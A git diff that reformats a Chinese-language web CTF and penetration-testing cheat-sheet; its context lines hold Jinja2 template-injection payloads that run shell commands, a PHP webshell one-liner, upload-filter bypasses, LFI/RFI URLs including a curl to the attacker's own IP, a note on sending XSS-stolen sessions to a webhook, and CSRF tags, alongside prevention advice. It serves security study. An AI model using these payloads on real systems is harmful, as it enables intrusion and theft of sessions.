@@ -13,9 +13,9 @@ date: 2024-02-07
 ## 解題重點
 
 - `robots.txt`
-- 掃port: nmap: `$ sudo apt install net-tools`[NMAP教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
+- 掃 port: nmap: `$ sudo apt install net-tools`[NMAP 教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
   - nmap: `$ nmap <url>`
-- 封包headers和contents: Wireshark、Browser、BurpSuite
+- 封包 headers 和 contents: Wireshark、Browser、BurpSuite
 - cookies
 - Enum directory/dns
 
@@ -174,7 +174,7 @@ date: 2024-02-07
 
 ##### 如何使用 SQLMAP
 
-- [ Day 4 很像走迷宮的sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
+- [ Day 4 很像走迷宮的 sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
 - [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好
 
   ```bash
@@ -295,7 +295,7 @@ date: 2024-02-07
 ```
 
 - 如何預防:
-  - 使用安全配置的 XML parser（如 Java 的 XMLInputFactory 關閉 DTD 與 external entities），因為xxe的攻擊前提在於開啟了不必要的兩個feature，讓attacker可以構造出一組讀取自創的DTD或是外部entity，達成LFI(算是?)
+  - 使用安全配置的 XML parser（如 Java 的 XMLInputFactory 關閉 DTD 與 external entities），因為 xxe 的攻擊前提在於開啟了不必要的兩個 feature，讓 attacker 可以構造出一組讀取自創的 DTD 或是外部 entity，達成 LFI(算是?)
   - 避免不必要的功能開啟
   - 做好輸入驗證和最小權限策略
 
@@ -310,7 +310,7 @@ fetch(`/getflag\)
 </script>
 ```
 
-- 利用XSS把session打到webhook上
+- 利用 XSS 把 session 打到 webhook 上
   {% raw %}
 
   ```javascript?
@@ -378,7 +378,7 @@ fetch(`/getflag\)
   {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
   ```
 
-  [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用hex
+  [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用 hex
 
   ```
   {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
@@ -443,7 +443,7 @@ fetch(`/getflag\)
 - 前提: 在 PHP 中需要特別啟用 `allow_url_include`
 - 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
   1. 寫入 webshell 之類的達到 RCE
-  2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper是有 LFI 弱點才能用</span>
+  2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper 是有 LFI 弱點才能用</span>
 
   ```bash
   $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
@@ -539,60 +539,60 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
 
 ### Deserialization
 
-要能夠達成insecure的反序列化，最重要的兩個前提是
+要能夠達成 insecure 的反序列化，最重要的兩個前提是
 
 - 反序列化的資料可控
-- 針對各個語言反序列化時或之後會觸發哪些magic method
+- 針對各個語言反序列化時或之後會觸發哪些 magic method
 
-- 可以搭配command injection
-- php可以搭配`phar`
+- 可以搭配 command injection
+- php 可以搭配`phar`
 - POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
-  - [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的PHP框架有沒有對應的payload達到RCE
-  - [ysoserial](https://github.com/frohoff/ysoserial): 紀錄JAVA版本的POP chain gadgets
+  - [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的 PHP 框架有沒有對應的 payload 達到 RCE
+  - [ysoserial](https://github.com/frohoff/ysoserial): 紀錄 JAVA 版本的 POP chain gadgets
   - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 
 | 語言   | 序列化         | 反序列化       | Magic Method                             |
 | ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Python | pickle.dumps() | pickle.loads() | `__reduce`                               |
-| PHP    | serialize      |                | unserialize                              | `__destruct()`: Object被銷毀或garbage collection會觸發<br>`__wakeup()`: unserialize時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成String處理時呼叫，`echo $obj;`<br> |
+| PHP    | serialize      |                | unserialize                              | `__destruct()`: Object 被銷毀或 garbage collection 會觸發<br>`__wakeup()`: unserialize 時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成 String 處理時呼叫，`echo $obj;`<br> |
 | Java   |                |                | `toString`<br>`readObject`<br>`finalize` |
-| .NET   |                |                | ViewState & Session會存放序列化資料      |
+| .NET   |                |                | ViewState & Session 會存放序列化資料      |
 
 ### Frontend
 
-攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
+攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部 server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
 
 ### SSRF
 
-create一個偽造的payload和一個對外的中間server溝通，並讓這個中間server因為我的偽造payload而同意讓我和更裡面的內網server溝通，這樣我就打到inner server，如果有preview card這樣的網站要特別注意有沒有SSRF的問題
+create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓這個中間 server 因為我的偽造 payload 而同意讓我和更裡面的內網 server 溝通，這樣我就打到 inner server，如果有 preview card 這樣的網站要特別注意有沒有 SSRF 的問題
 
-- 利用gopher協議建一個偽造payload
+- 利用 gopher 協議建一個偽造 payload
 
 - 如何預防:
-  - 限制可訪問的 URL / IP 範圍(使用whitelist)
+  - 限制可訪問的 URL / IP 範圍(使用 whitelist)
   - 避免解析內部 IP → 防止攻擊者透過 URL 指向內網或 localhost (127.0.0.1) 服務。
   - 使用安全的 HTTP client → 設定 timeout、最大連線數、禁用不必要的協議（FTP、file://、gopher:// 等）。
   - 對特殊情境使用代理 / sandbox
 
 ### CSRF(Cross-Site Request Frogery)
 
-- [[Day25]- 新手的Web系列CSRF](https://ithelp.ithome.com.tw/articles/10251769)
+- [[Day25]- 新手的 Web 系列 CSRF](https://ithelp.ithome.com.tw/articles/10251769)
   > 1. 使用者登入網站
-  > 2. 使用者透過身份驗證在本機形成cookie
-  > 3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下html程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
-  > 4. 惡意程式碼利用使用者的身份發請求，即執行CSRF
-  > 5. 使用者的帳號少錢錢勒QQ
+  > 2. 使用者透過身份驗證在本機形成 cookie
+  > 3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下 html 程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
+  > 4. 惡意程式碼利用使用者的身份發請求，即執行 CSRF
+  > 5. 使用者的帳號少錢錢勒 QQ
   >
   > ![](https://i.imgur.com/gwCvSqZ.png)
   >
-  > 常見的CSRF方法
+  > 常見的 CSRF 方法
   >
-  > - HTML標籤
+  > - HTML 標籤
   >   - `<img>`標籤屬性
   >     ```html
   >     <img src="惡意連結" />
   >     ```
-  >     以GET方式請求第三方網站，瀏覽器會帶上使用者的cookie發出GET請求
+  >     以 GET 方式請求第三方網站，瀏覽器會帶上使用者的 cookie 發出 GET 請求
   >   - `<script>`標籤屬性
   >     ```javascript
   >     `<script src="惡意連結">`;
@@ -602,33 +602,33 @@ create一個偽造的payload和一個對外的中間server溝通，並讓這個�
   >     `<iframe src="惡意連結">`</iframe>
   >     ```
 
-也就是他和XSS的其中一個目的有點像，那就是偷到使用者的cookie/session，只是方式不同，一個是利用javascript的injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種request，如果該網站沒有對user進行額外的身份驗證，那們光靠user cookie/session就有機會達成轉帳、發文之類的操作
+也就是他和 XSS 的其中一個目的有點像，那就是偷到使用者的 cookie/session，只是方式不同，一個是利用 javascript 的 injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種 request，如果該網站沒有對 user 進行額外的身份驗證，那們光靠 user cookie/session 就有機會達成轉帳、發文之類的操作
 
-#### 如何預防CSRF
+#### 如何預防 CSRF
 
-- CSRF Token: 這是最簡單的方式，既然attacker可以透過惡意網站得到victim的cookie，那我就額外在server side多一個驗證token的步驟，而該token無論如何都不會被attacker利用惡意網站得知，就可以確保目前的request是不是本人，而為什麼CSRF token無法被attacker得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
+- CSRF Token: 這是最簡單的方式，既然 attacker 可以透過惡意網站得到 victim 的 cookie，那我就額外在 server side 多一個驗證 token 的步驟，而該 token 無論如何都不會被 attacker 利用惡意網站得知，就可以確保目前的 request 是不是本人，而為什麼 CSRF token 無法被 attacker 得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
 
   > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。
 
-  所以，attacker的惡意網站並不會得知user在a.com這個網域的token，應該說原本就是這樣設計的，所以除非attacker**現場**看到受害者的browser content，才能得知CSRF Token
+  所以，attacker 的惡意網站並不會得知 user 在 a.com 這個網域的 token，應該說原本就是這樣設計的，所以除非 attacker**現場**看到受害者的 browser content，才能得知 CSRF Token
 
 - SameSite Cookie
 
-  就是設定cookie
+  就是設定 cookie
 
   > Set-Cookie: sessionid=abc123; SameSite=Strict
 
-  SameSite的效果是跨網站 request 不會帶 cookie，那麼同樣的就算victim點開malicious website，也一樣不會被對方讀取到cookie
+  SameSite 的效果是跨網站 request 不會帶 cookie，那麼同樣的就算 victim 點開 malicious website，也一樣不會被對方讀取到 cookie
 
 - 敏感操作使用 POST
 
-  前面的payload範例有提到很多都是透過GET qeury進行惡意操作，那麼我們只要把敏感操作都利用POST的方式處理，就可以大大降低CSRF發生的情況
+  前面的 payload 範例有提到很多都是透過 GET qeury 進行惡意操作，那麼我們只要把敏感操作都利用 POST 的方式處理，就可以大大降低 CSRF 發生的情況
 
 ### Upload
 
-- 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
+- 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到 RCE
 - 改 Extension: 如果有保護但只看 extension : 那就偽造 extension 後夾帶 webshell 達到 RCE (`webshell.png.php`)
-- 改 Content-Typebypass: `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)
+- 改 Content-Typebypass: `IMAGETYPE`(加入合法的 File Signature) + bypass file type(修改封包 header)
 - 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
 - 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload
 
@@ -703,12 +703,12 @@ $ cp /usr/share/webshells/php/simple-backdoor.php . # php
 $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 webshell
 ```
 
-### 如果是WordPress網頁
+### 如果是 WordPress 網頁
 
 起手式一定是用 wpscan 去掃 plugin 版本，查 exploit
 
 - 所以流程是：(nmap+ffuf)列舉發現 WordPress → 識別 plugin → searchsploit 找漏洞 → 手動測試或 sqlmap 利用。不需要 wpscan，標準的 web 列舉流程就能走到這一步。
-- [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
+- [WpScan](https://wpscan.com/)專門檢測 WordPress 類型的網頁，有哪些漏洞，前期可以掃描出 WP 版本、安裝的 theme 或是插件有哪些、安全漏洞等等
   ```bash
   # 跑 wpscan 找外掛和使用者
   $ wpscan --url http://alvida-eatery.local -e ap,at,u --plugins-detection aggressive # 代表 enum 出 all plugin/all theme/user
@@ -738,13 +738,13 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
 
 | Fuck                                                                    | Beautifier                                                                                |
 | ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
-| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/) | 把JS的程式變成可讀性很差的東西                                                            | [JSNice](http://www.jsnice.org/) |
-| [jjencode](https://utf-8.jp/public/jjencode.html)                       | [JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案                           |
+| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/) | 把 JS 的程式變成可讀性很差的東西                                                            | [JSNice](http://www.jsnice.org/) |
+| [jjencode](https://utf-8.jp/public/jjencode.html)                       | [JS 反混淆器](https://beautifier.io/): 可以反混淆或解密 JS 的檔案                           |
 | [aaencode](https://utf-8.jp/public/aaencode.html)                       | [JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)                                          |
 | [Esolang List](https://esolangs.org/wiki/Language_list)                 | [JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)                                 |
 |                                                                         | [aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html) |
 
-- psysh: PHP的互動式shell
+- psysh: PHP 的互動式 shell
 - pwsh: Kali 內建的 Powershell
 - wasm → c: [wabt](https://github.com/WebAssembly/wabt)
   ```bash
